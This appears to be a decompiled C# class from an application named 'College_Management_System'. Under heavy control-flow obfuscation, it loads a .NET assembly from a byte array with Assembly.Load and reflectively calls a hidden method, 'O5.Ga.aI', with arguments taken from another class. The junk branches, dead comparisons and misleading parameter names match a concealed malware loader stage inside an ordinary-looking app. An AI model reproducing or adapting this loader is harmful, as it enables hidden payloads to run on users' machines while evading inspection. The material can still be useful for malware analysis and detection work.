using System;
using System.Reflection;

namespace College_Management_System
{
	// Token: 0x0200000D RID: 13
	public class ax
	{
		// Token: 0x06000046 RID: 70 RVA: 0x00004C5C File Offset: 0x00002E5C
		public ax(byte[] FeedbackSize)
		{
			int num5;
			for (;;)
			{
				IL_C9:
				int num = Form7.mqgfoefwabbyeu(27);
				int num2 = 2;
				for (;;)
				{
					num2 ^= 57;
					for (;;)
					{
						IL_77:
						int num3 = 3;
						int num4 = 3;
						for (;;)
						{
							switch (num4 ^ 54)
							{
							case 50:
								switch (num3)
								{
								case 56:
								{
									RuntimeMethodHandle runtimeMethodHandle = methodof(ax.MinorVersion(Assembly)).MethodHandle;
									num3 = 1;
									goto IL_2B;
								}
								case 57:
									break;
								case 58:
									switch (num2)
									{
									case 56:
										goto IL_BB;
									case 57:
										goto IL_C9;
									case 58:
										switch (num + 55)
										{
										case 0:
										{
											bool flag = num5 == 251367146;
											num = -13;
											goto IL_16;
										}
										case 1:
										{
											bool flag;
											if (flag)
											{
												num = -12;
												goto IL_16;
											}
											goto IL_144;
										}
										case 2:
										{
											RuntimeMethodHandle runtimeMethodHandle2 = methodof(ax..ctor(byte[])).MethodHandle;
											num = -14;
											goto IL_16;
										}
										case 3:
											num5 = 251367149;
											num = -16;
											goto IL_16;
										case 4:
											goto IL_141;
										}
										goto Block_3;
									case 59:
										break;
									default:
										num3 = 0;
										goto IL_2B;
									}
									IL_16:
									num ^= 57;
									break;
								case 59:
									goto IL_B6;
								default:
									num4 = 2;
									continue;
								}
								num2 = 3;
								num3 = 2;
								goto IL_2B;
							case 51:
							{
								RuntimeMethodHandle runtimeMethodHandle3 = methodof(ax..ctor(byte[])).MethodHandle;
								num4 = 5;
								continue;
							}
							case 52:
								goto IL_77;
							case 53:
								goto IL_2B;
							}
							IL_48:
							num4 = 4;
							continue;
							IL_2B:
							num3 ^= 57;
							goto IL_48;
						}
					}
					IL_B6:
					continue;
					IL_BB:
					RuntimeMethodHandle runtimeMethodHandle4 = methodof(ax..ctor(byte[])).MethodHandle;
					num2 = 1;
					continue;
					Block_3:
					num2 = 0;
				}
			}
			IL_141:
			bool flag2 = false;
			goto IL_147;
			IL_144:
			flag2 = true;
			IL_147:
			if (!flag2)
			{
				num5 = 251367108;
			}
			else
			{
				bool flag3 = num5 == 251367141;
				if (flag3)
				{
					num5 = 251367102;
				}
				else
				{
					num5 = 251367140;
				}
			}
			int num6 = 251367122;
			bool flag4 = num6 == 251367104;
			if (!flag4)
			{
				bool flag5 = num6 == 251367177;
				if (flag5)
				{
				}
			}
			int num7 = 251367130;
			bool flag6 = num7 == 251367160;
			if (!flag6)
			{
				bool flag7 = num7 == 251367127;
				if (flag7)
				{
				}
			}
			this.MinorVersion(Assembly.Load(FeedbackSize));
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00004EC8 File Offset: 0x000030C8
		public object MinorVersion(Assembly ApplicationIdentity)
		{
			int num3;
			for (;;)
			{
				IL_39:
				int num = Form7.mqgfoefwabbyeu(32);
				int num2 = 1;
				for (;;)
				{
					switch (num2 ^ 62)
					{
					case 60:
						switch (num + 61)
						{
						case 0:
							num3 = 251367137;
							num = Form7.mqgfoefwabbyeu(19);
							goto IL_08;
						case 1:
						{
							bool flag = num3 == 251367103;
							num = -14;
							goto IL_08;
						}
						case 2:
						{
							RuntimeMethodHandle runtimeMethodHandle = methodof(ax.MinorVersion(Assembly)).MethodHandle;
							num = -15;
							goto IL_08;
						}
						case 3:
						{
							bool flag;
							if (flag)
							{
								num = -13;
								goto IL_08;
							}
							goto IL_94;
						}
						case 4:
							goto IL_91;
						default:
							num2 = 3;
							continue;
						}
						break;
					case 61:
						goto IL_39;
					case 62:
					{
						RuntimeMethodHandle runtimeMethodHandle2 = methodof(ax..ctor(byte[])).MethodHandle;
						num2 = 0;
						continue;
					}
					case 63:
						goto IL_08;
					}
					IL_25:
					num2 = 2;
					continue;
					IL_08:
					num ^= 52;
					goto IL_25;
				}
			}
			IL_91:
			bool flag2 = false;
			goto IL_97;
			IL_94:
			flag2 = true;
			IL_97:
			if (!flag2)
			{
				num3 = 251367116;
			}
			else
			{
				bool flag3 = num3 == 251367121;
				if (flag3)
				{
					num3 = 251367142;
				}
				else
				{
					num3 = 251367159;
				}
			}
			int num4 = 251367198;
			bool flag4 = num4 == 251367145;
			if (!flag4)
			{
				bool flag5 = num4 == 251367199;
				if (flag5)
				{
				}
			}
			byte b = 7;
			bool flag6 = b == 49;
			if (!flag6)
			{
				bool flag7 = b == 56;
				if (flag7)
				{
				}
			}
			int num5 = 251367146;
			bool flag8 = num5 == 251367126;
			if (!flag8)
			{
				bool flag9 = num5 == 251367143;
				if (flag9)
				{
				}
			}
			int num6 = 251367181;
			bool flag10 = num6 == 251367141;
			if (!flag10)
			{
				bool flag11 = num6 == 251367179;
				if (flag11)
				{
				}
			}
			int num7 = 251367126;
			bool flag12 = num7 == 251367157;
			if (!flag12)
			{
				bool flag13 = num7 == 251367107;
				if (flag13)
				{
				}
			}
			int num8 = 251367124;
			bool flag14 = num8 == 251367102;
			if (!flag14)
			{
				bool flag15 = num8 == 251367181;
				if (flag15)
				{
				}
			}
			int num9 = 251367101;
			bool flag16 = num9 == 251367163;
			if (!flag16)
			{
				bool flag17 = num9 == 251367194;
				if (flag17)
				{
				}
			}
			int num10 = 251367136;
			bool flag18 = num10 == 251367156;
			if (!flag18)
			{
				bool flag19 = num10 == 251367161;
				if (flag19)
				{
				}
			}
			int num11 = 251367146;
			bool flag20 = num11 == 251367158;
			if (!flag20)
			{
				bool flag21 = num11 == 251367169;
				if (flag21)
				{
				}
			}
			byte b2 = 14;
			bool flag22 = b2 == 70;
			if (!flag22)
			{
				bool flag23 = b2 == 120;
				if (flag23)
				{
				}
			}
			int num12 = 251367176;
			bool flag24 = num12 == 251367166;
			if (!flag24)
			{
				bool flag25 = num12 == 251367131;
				if (flag25)
				{
				}
			}
			byte b3 = 93;
			bool flag26 = b3 == 67;
			if (!flag26)
			{
				bool flag27 = b3 == 89;
				if (flag27)
				{
				}
			}
			byte b4 = 154;
			bool flag28 = b4 == 116;
			if (!flag28)
			{
				bool flag29 = b4 == 85;
				if (flag29)
				{
				}
			}
			byte b5 = 147;
			bool flag30 = b5 == 114;
			if (!flag30)
			{
				bool flag31 = b5 == 130;
				if (flag31)
				{
				}
			}
			int num13 = 251367170;
			bool flag32 = num13 == 251367124;
			if (!flag32)
			{
				bool flag33 = num13 == 251367159;
				if (flag33)
				{
				}
			}
			int num14 = 251367102;
			bool flag34 = num14 == 251367112;
			if (!flag34)
			{
				bool flag35 = num14 == 251367175;
				if (flag35)
				{
				}
			}
			int num15 = 251367138;
			bool flag36 = num15 == 251367135;
			if (!flag36)
			{
				bool flag37 = num15 == 251367172;
				if (flag37)
				{
				}
			}
			int num16 = 251367143;
			bool flag38 = num16 == 251367115;
			if (!flag38)
			{
				bool flag39 = num16 == 251367119;
				if (flag39)
				{
				}
			}
			Type type = ApplicationIdentity.GetType("O5.Ga");
			byte b6;
			for (;;)
			{
				int num17 = 14;
				for (;;)
				{
					switch (num17 ^ 60)
					{
					case 50:
						b6 = 39;
						num17 = 8;
						continue;
					case 51:
					{
						bool flag40;
						if (flag40)
						{
							num17 = 10;
							continue;
						}
						goto IL_6AE;
					}
					case 52:
					{
						bool flag40 = b6 == 188;
						num17 = 15;
						continue;
					}
					case 53:
					{
						RuntimeMethodHandle runtimeMethodHandle3 = methodof(ax.MinorVersion(Assembly)).MethodHandle;
						num17 = 9;
						continue;
					}
					case 54:
						goto IL_6AB;
					}
					break;
				}
			}
			IL_6AB:
			bool flag41 = false;
			goto IL_6B1;
			IL_6AE:
			flag41 = true;
			IL_6B1:
			if (!flag41)
			{
				b6 = 16;
			}
			else
			{
				bool flag42 = b6 == 184;
				if (flag42)
				{
					b6 = 105;
				}
				else
				{
					b6 = 59;
				}
			}
			int num18 = 251367104;
			bool flag43 = num18 == 251367110;
			if (!flag43)
			{
				bool flag44 = num18 == 251367188;
				if (flag44)
				{
				}
			}
			int num19 = 251367115;
			bool flag45 = num19 == 251367157;
			if (!flag45)
			{
				bool flag46 = num19 == 251367163;
				if (flag46)
				{
				}
			}
			int num20 = 251367141;
			bool flag47 = num20 == 251367182;
			if (!flag47)
			{
				bool flag48 = num20 == 251367137;
				if (flag48)
				{
				}
			}
			byte b7 = 121;
			bool flag49 = b7 == 148;
			if (!flag49)
			{
				bool flag50 = b7 == 76;
				if (flag50)
				{
				}
			}
			byte b8 = 118;
			bool flag51 = b8 == 187;
			if (!flag51)
			{
				bool flag52 = b8 == 198;
				if (flag52)
				{
				}
			}
			type.InvokeMember("aI", BindingFlags.InvokeMethod, null, null, new string[]
			{
				ChannelSinkStack.DT,
				ChannelSinkStack.DF,
				"College_Management_System"
			});
			object result;
			for (;;)
			{
				int num21 = Form7.mqgfoefwabbyeu(31);
				for (;;)
				{
					num21 ^= 53;
					switch (num21 + 57)
					{
					case 0:
					{
						RuntimeMethodHandle runtimeMethodHandle4 = methodof(ax.MinorVersion(Assembly)).MethodHandle;
						num21 = Form12.wsyoqrrjsoniul(53);
						continue;
					}
					case 1:
						result = 1003;
						num21 = -4;
						continue;
					case 2:
						return result;
					case 3:
						return result;
					}
					break;
				}
			}
			return result;
		}
	}
}
